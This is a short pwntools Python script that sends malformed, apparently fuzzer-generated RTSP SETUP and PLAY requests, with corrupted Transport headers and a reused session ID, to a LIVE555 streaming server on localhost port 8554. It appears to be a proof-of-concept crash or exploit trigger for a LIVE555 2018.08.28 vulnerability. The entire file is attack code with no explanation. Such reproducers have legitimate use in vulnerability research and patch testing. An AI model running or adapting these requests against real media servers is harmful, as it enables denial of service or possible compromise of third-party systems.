from pwn import *

io = remote("127.0.0.1", 8554)

io.send(b"SETUP rtsp://127.0.0.1:8554/mpeg1or2AudioVideoTest/track1 RTSP/1.0\r\nCSeq: 3\r\nTransport: RTP/AVP;unic-st;client_port=45546-455000022B8\r\nRaoge: npt=0.000-\r\n\r\n")
io.recv()

io.send(b"SETUP rtsp://127.0.0.1:8554/mpeg1or2AudioVideoTest/track1 RTSP/1.0\r\nCSeq: 3\r\nTransport: RTP/AVP;unicast;client_port=50778.08.28)\r\n\r\n")
io.recvuntil("Session: ")
sessionID = io.recv(8)
io.recv()

io.send(b"SETUP rtsp://127.0.0.1:8554/mpeg1or2AudioVideoTest/track2 RTSP/1.0\r\nCSeq: 4\r\nTransport: RTP/AVP;unicast;client_port=45546-45547\r\nSession: " + sessionID + b"\r\n\r\nPLAY rtsp://127.0.0.1:8554/mpeg1or2AudioVideoTest/ RTSP/1.0\r\nCSeq: 5\r\nSession: " + sessionID + b"\r\nRange: npt=0.000-\r\n\r\nSETUP rtsp://127.0.0.1:8554/mpeg1or2AudioVideoTest/track1 RTSP/1.0\r\nCSeq: 3\r\nTransp[ort: RTP/AVP;unicast;client_port=50778.08.28)\r\nSession: " + sessionID + b"\r\n\r\nSETUP rtsp://127.0.0.1:8554/mpeg1or2AudioVideoTest/track2 RTSP/1.0\r\nCSeq: 4\r\nTransport: RTP/AVP;unicast;client_port=45546-45547\r\nSession: " + sessionID + b"\r\n\r\nPLAY rtsp://127.0.0.1:8554/mpe;client_port=50778.08.28)\r\nSession: " + sessionID + b"\r\n\r\nSETUP rtsp://127.0IVE555 Streaming Media v2018.08.28)\r\nSession: " + sessionID + b"\r\nRange: npt=0.000-\r\n")
io.recv()